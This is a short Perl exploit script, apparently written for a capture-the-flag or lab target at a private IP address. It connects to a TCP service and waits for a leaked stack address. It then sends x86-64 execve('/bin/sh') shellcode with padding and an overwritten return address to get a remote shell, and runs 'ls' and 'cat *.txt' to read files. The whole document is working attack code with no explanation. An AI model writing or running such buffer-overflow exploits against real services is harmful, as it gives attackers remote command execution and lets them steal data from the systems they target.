#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket;

my $sock = new IO::Socket::INET(PeerAddr=>"10.1.1.10", PeerPort=>13050, Proto=>"tcp");
die "failed to connect: $!\n" unless $sock;
binmode($sock);

my $shellcode = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\xb8\x3b\x00\x00\x00\x48\x89\xe7\x31\xf6\x48\x31\xd2\x0f\x05";

while (my $line = <$sock>) {
	print $line;
	if ($line =~ /target \| \[0x([0-9a-fA-F]+)\]/) {
		my $target = hex($1);
		print $sock $shellcode;
		print $sock ("x" x (0x58 - length($shellcode)));
		print $sock pack("Q", $target);
		print $sock " \n";
		print $sock "ls\n";
		print $sock "cat *.txt\n";
		print $sock "exit\n";
	}
}

close($sock);
